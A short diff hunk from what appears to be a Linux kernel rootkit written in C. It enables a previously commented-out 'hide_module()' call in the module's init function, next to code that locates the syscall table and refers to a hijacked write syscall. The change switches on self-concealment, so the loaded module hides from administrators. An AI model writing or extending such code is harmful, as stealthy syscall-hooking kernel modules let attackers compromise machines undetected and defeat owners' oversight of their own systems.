@@ -280,7 +280,7 @@ void restore_hijacked_write_syscall(void) {
 }
 
 static int init(void) {
-  // hide_module();
+  hide_module();
   printk("\nModule starting...\n");
   syscall_table = (unsigned long long*) find();
   if ( syscall_table != NULL ) {
